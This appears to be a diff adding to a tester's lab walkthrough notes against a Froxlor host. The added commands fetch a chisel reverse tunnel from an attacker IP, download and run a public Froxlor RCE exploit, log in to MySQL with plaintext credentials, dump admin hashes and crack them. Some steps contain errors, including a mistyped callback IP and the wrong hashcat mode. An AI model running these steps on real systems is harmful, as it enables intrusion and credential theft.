@@ -128,4 +128,26 @@ db=oscdb, user=oscuser, password=7NVLVTDGJ38HM2TQ
 # local.txt is in /root
 
 searchsploit -m 51263
+
+chisel server --port 8081 --reverse
+sudo tcpdump -nvvvXi tun0 tcp port 8081
+wget http://192.168.45.160/chisel -O chisel
+
+# need to use port 80 because other ports seem to be blocked. we need to use a port that's open on the target machine
+./chisel client 192.168.45.160:80 R:60002:0.0.0.0:60002
+
+# try froxlor RCE exploit - https://github.com/mhaskar/CVE-2023-0315
+wget https://raw.githubusercontent.com/mhaskar/CVE-2023-0315/main/froxlor-rce.py
+python3 froxlor-rce.py http://127.0.0.1:60002 admin password 182.168.45.160 9999
+
+# can't login. let's see if we can access the internal mysql server using previously found creds
+# from target
+./chisel client 192.168.45.160:80 R:3306:0.0.0.0:3306
+# from kali - pw: 7NVLVTDGJ38HM2TQ
+mysql -u oscuser -D oscdb -h 127.0.0.1 -p
+select * from administrators;
+# find a user (admin) and password hash
+$P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0 
+hashcat -m 0 admin.md5.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
 ```
